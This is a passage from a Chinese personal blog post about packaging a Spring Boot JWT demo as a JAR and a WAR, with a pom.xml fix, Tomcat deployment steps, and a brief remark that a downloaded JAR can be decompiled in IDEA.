<p><a href="https://blog.csdn.net/qingzhantianxia/article/details/129104228">https://blog.csdn.net/qingzhantianxia/article/details/129104228</a></p>
<h2 id="打包部署-jarwar">打包部署-JAR&amp;WAR<a hidden class="anchor" aria-hidden="true" href="#打包部署-jarwar">#</a></h2>
<h3 id="jar">JAR<a hidden class="anchor" aria-hidden="true" href="#jar">#</a></h3>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901264.png" style="max-width: 100%; height: auto;"></p>
<p>出现的问题：</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859152.png" style="max-width: 100%; height: auto;"></p>
<p>解决：</p>
<p><a href="https://blog.csdn.net/Mrzhuangr/article/details/124731024">https://blog.csdn.net/Mrzhuangr/article/details/124731024</a><br>
<a href="https://blog.csdn.net/wobenqingfeng/article/details/129914639">https://blog.csdn.net/wobenqingfeng/article/details/129914639</a></p>
<div class="code-block-container" id="code-1769750397419894300" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397419894300">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">xml</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397419894300" title="Toggle" aria-expanded="false" aria-controls="code-1769750397419894300" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397419894300-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span><span class="lnt" id="6"><span class="lnlinks">6</span>
</span><span class="lnt" id="7"><span class="lnlinks">7</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">1、pom.xml 必须有mainClass，无true或者true改为false
</span></span><span class="line"><span class="cl"><span class="nt">&lt;configuration&gt;</span>              			
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;mainClass&gt;</span>com.example.testjwtdemo.TestJwtDemoApplication<span class="nt">&lt;/mainClass&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;skip&gt;</span>false<span class="nt">&lt;/skip&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/configuration&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>正确执行后：可以正常访问</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901376.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859900.png" style="max-width: 100%; height: auto;"></p>
<h3 id="war">WAR<a hidden class="anchor" aria-hidden="true" href="#war">#</a></h3>
<p>参考：</p>
<p><a href="https://mp.weixin.qq.com/s/HyqVt7EMFcuKXfiejtfleg">https://mp.weixin.qq.com/s/HyqVt7EMFcuKXfiejtfleg</a></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901895.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900130.png" style="max-width: 100%; height: auto;"></p>
<div class="code-block-container" id="code-1769750397420559800" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397420559800">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397420559800" title="Toggle" aria-expanded="false" aria-controls="code-1769750397420559800" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397420559800-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">@Override
</span></span><span class="line"><span class="cl">    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {
</span></span><span class="line"><span class="cl">        return builder.sources(TestJwtDemoApplication.class);
</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>将war文件放在：<code>D:\JavaCode\Tomcat\apache-tomcat-9.0.105\webapps</code>；</p>
<p>运行：<code>D:\JavaCode\Tomcat\apache-tomcat-9.0.105\bin\starup.bat</code>;</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902876.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901210.png" style="max-width: 100%; height: auto;"></p>
<p>访问：</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300908647.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902438.png" style="max-width: 100%; height: auto;"></p>
<h3 id="安全问题-3">安全问题：<a hidden class="anchor" aria-hidden="true" href="#安全问题-3">#</a></h3>
<p>无源码下载风险</p>
<h4 id="源码反编译">源码反编译：<a hidden class="anchor" aria-hidden="true" href="#源码反编译">#</a></h4>
<p>得到.jar压缩包后解压，用idea打开</p>
<p>会自动反编译（注释没了）</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859222.png" style="max-width: 100%; height: auto;"></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/xvsf/tags/javaee/">JavaEE</a></li>
      <li><a href="http://localhost:1313/xvsf/tags/web%E5%BC%80%E5%8F%91/">Web开发</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/xvsf/posts/spring/">
    <span class="title">« Prev</span>
    <br>
    <span>Spring</span>
  </a>
  <a class="next" href="http://localhost:1313/xvsf/posts/javase%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">
    <span class="title">Next »</span>
    <br>
    <span>JavaSE基础学习</span>
  </a>
</nav>

  </footer><div class="giscus"></div>
<script src="https://giscus.app/client.js"
        data-repo="XVSHIFU/xvsf"
        data-repo-id="R_kgDOQ6WxXQ"
        data-category="Announcements"
        data-category-id="DIC_kwDOQ6WxXc4C1A4B"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="light_protanopia"
        data-lang="zh-CN"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="http://localhost:1313/xvsf/">xvsf</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>


<script>
document.addEventListener('DOMContentLoaded', function() {
    
    document.querySelectorAll('.code-header').forEach(header => {
        header.addEventListener('click', (e) => {
            
            if (e.target.closest('.copy-btn')) return;
            
            if (e.target.closest('.toggle-btn')) return;
            const container = header.parentElement;
            const isExpanded = container.getAttribute('data-expanded') === 'true';
            const next = !isExpanded;
            container.setAttribute('data-expanded', next);
            container.setAttribute('aria-expanded', next);
            const toggle = container.querySelector('.toggle-btn');
            if (toggle) toggle.setAttribute('aria-expanded', String(next));
        });
    });

    
    document.querySelectorAll('.code-block-container .toggle-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            const container = btn.closest('.code-block-container');
            const isExpanded = container.getAttribute('data-expanded') === 'true';
            const next = !isExpanded;
            container.setAttribute('data-expanded', next);
            container.setAttribute('aria-expanded', next);
            
            btn.setAttribute('aria-expanded', String(next));
        });
    });

    
    document.querySelectorAll('.copy-btn').forEach(btn => {
        btn.addEventListener('click', async (e) => {
            e.stopPropagation();
            const container = btn.closest('.code-block-container');
            const codeEl = container && container.querySelector('code');
            const code = codeEl ? codeEl.innerText : '';
            try {
                if (navigator.clipboard && navigator.clipboard.writeText) {
                    await navigator.clipboard.writeText(code);
                } else {
                    const ta = document.createElement('textarea');
                    ta.value = code;
                    document.body.appendChild(ta);
                    ta.select();
                    document.execCommand('copy');
                    ta.remove();
                }
                const originalLabel = btn.getAttribute('aria-label') || '';
                btn.setAttribute('aria-label', '已复制');
                setTimeout(() => btn.setAttribute('aria-label', originalLabel), 2000);
            } catch (err) {
                console.error('Failed to copy!', err);
            }
        });
    });
});
</script>




<script>
(function() {
    
    const STOP_TIME = 15000; 
    const NUMBER_OF_LEAVES = 30; 
    
    
    if (window.innerWidth < 768) return;

    var container = document.createElement('div');
    container.id = "sakura-container";
    container.style.position = 'fixed';
    container.style.top = '0';
    container.style.left = '0';
    container.style.width = '100%';
    container.style.height = '100%';
    container.style.pointerEvents = 'none'; 
    container.style.zIndex = '9999';
    document.body.appendChild(container);

    function createLeaf() {
        var leaf = document.createElement('div');
        
        leaf.style.position = 'absolute';
        leaf.style.width = (Math.random() * 10 + 10) + 'px'; 
        leaf.style.height = (Math.random() * 5 + 5) + 'px';
        leaf.style.background = 'linear-gradient(to bottom right, #ffc0cb, #ffb6c1)';
        leaf.style.borderRadius = '10px 0'; 
        leaf.style.opacity = Math.random() * 0.5 + 0.3;
        leaf.style.top = '-20px';
        leaf.style.left = Math.random() * 100 + '%';
        
        
        var duration = Math.random() * 5 + 5 + 's'; 
        var delay = Math.random() * 5 + 's';
        
        leaf.style.transition = `top ${duration} linear, transform ${duration} ease-in-out, opacity ${duration}`;
        container.appendChild(leaf);

        
        setTimeout(function() {
            leaf.style.top = '110%'; 
            leaf.style.transform = `rotate(${Math.random() * 360}deg) translateX(${Math.random() * 100 - 50}px)`;
            leaf.style.opacity = '0';
        }, 100);

        
        setTimeout(function() {
            leaf.remove();
        }, parseFloat(duration) * 1000 + 1000);
    }

    
    var interval = setInterval(function() {
        if (document.getElementById('sakura-container')) {
            createLeaf();
        }
    }, 400); 

    
    setTimeout(function() {
        clearInterval(interval); 
        
        
        setTimeout(function() {
            if(container) container.remove();
            console.log("樱花已落尽。");
        }, 10000); 
        
    }, STOP_TIME);

})();
</script>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
